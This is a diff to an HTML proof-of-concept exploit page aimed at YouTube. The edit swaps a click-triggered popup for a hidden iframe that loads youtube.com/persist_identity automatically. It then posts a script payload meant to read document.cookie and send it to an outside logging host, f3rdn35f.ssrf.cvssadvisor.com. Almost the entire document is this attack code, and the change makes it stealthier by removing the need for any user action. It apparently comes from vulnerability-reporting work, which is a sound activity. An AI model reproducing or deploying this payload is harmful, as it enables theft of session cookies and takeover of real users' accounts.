@@ -1,25 +1,23 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <button onclick="exploit()">Open YouTube Studio</button>
   <script>
-    function exploit() {
-      // Open the target URL in a new tab
-      const popup = window.open('https://studio.youtube.com/channel/UCRgUzVpcO1waCrkOggRA-gw/content/promotions?d=pcd&videoId=XeVLn-RSTss&promotionEntryPoint=PROMOTION_ENTRY_POINT_CHANNEL_PAGE_VIDEOS_TAB_OVERFLOW_MENU&subid=ww-ww-xs-ip-yt_adstube_channel_page_videos!o2');
+    // Open the vulnerable page in a hidden iframe
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'https://www.youtube.com/persist_identity';
+    document.body.appendChild(iframe);
 
-      // Wait for the page to load, then inject the payload
-      setTimeout(() => {
-        const payload = `
-          goog.loadModule(function(exports) {
-            fetch("https://f3rdn35f.ssrf.cvssadvisor.com/log?cookie=" + encodeURIComponent(document.cookie));
-            exports.PoC = true;
-            return exports;
-          });
-        `;
-        // Send the payload to the new tab
-        popup.postMessage(payload, 'https://studio.youtube.com/channel/UCRgUzVpcO1waCrkOggRA-gw/content/promotions?d=pcd&videoId=XeVLn-RSTss&promotionEntryPoint=PROMOTION_ENTRY_POINT_CHANNEL_PAGE_VIDEOS_TAB_OVERFLOW_MENU&subid=ww-ww-xs-ip-yt_adstube_channel_page_videos!o2');
-      }, 3000); // Adjust delay based on page load time
-    }
+    // Wait for the page to load, then inject the payload
+    iframe.onload = function() {
+      const payload = `
+        goog.loadModule(function(exports) {
+          fetch("https://f3rdn35f.ssrf.cvssadvisor.com/log?cookie=" + encodeURIComponent(document.cookie));
+          return exports;
+        });
+      `;
+      iframe.contentWindow.postMessage(payload, 'https://www.youtube.com/persist_identity');
+    };
   </script>
 </body>
 </html>
